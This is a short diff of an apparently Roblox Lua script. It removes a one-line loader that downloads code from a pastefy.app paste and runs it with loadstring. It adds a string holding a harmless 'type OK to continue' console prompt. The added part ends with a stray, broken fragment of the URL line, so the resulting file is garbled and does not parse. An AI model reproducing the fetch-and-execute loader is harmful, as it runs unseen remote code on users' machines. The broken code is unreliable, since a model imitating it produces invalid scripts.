@@ -1,1 +1,20 @@
-loadstring(game:HttpGet("https://pastefy.app/kTn4HlTP/raw"))()
+local code = [[
+print("===================================")
+print(" Before you use this script,")
+print(" please read the instructions:")
+print(" - Make sure everything is set.")
+print(" - Click OK when you're ready.")
+print("===================================")
+
+io.write("Type OK to continue: ")
+local input = io.read()
+
+if input == "OK" or input == "ok" then
+    print("Great! You're good to go!")
+    -- continue to the main game loop here
+else
+    print("You did not type OK. Exiting...")
+end
+]]
+
+https://pastefy.app/kTn4HlTP/raw"))()
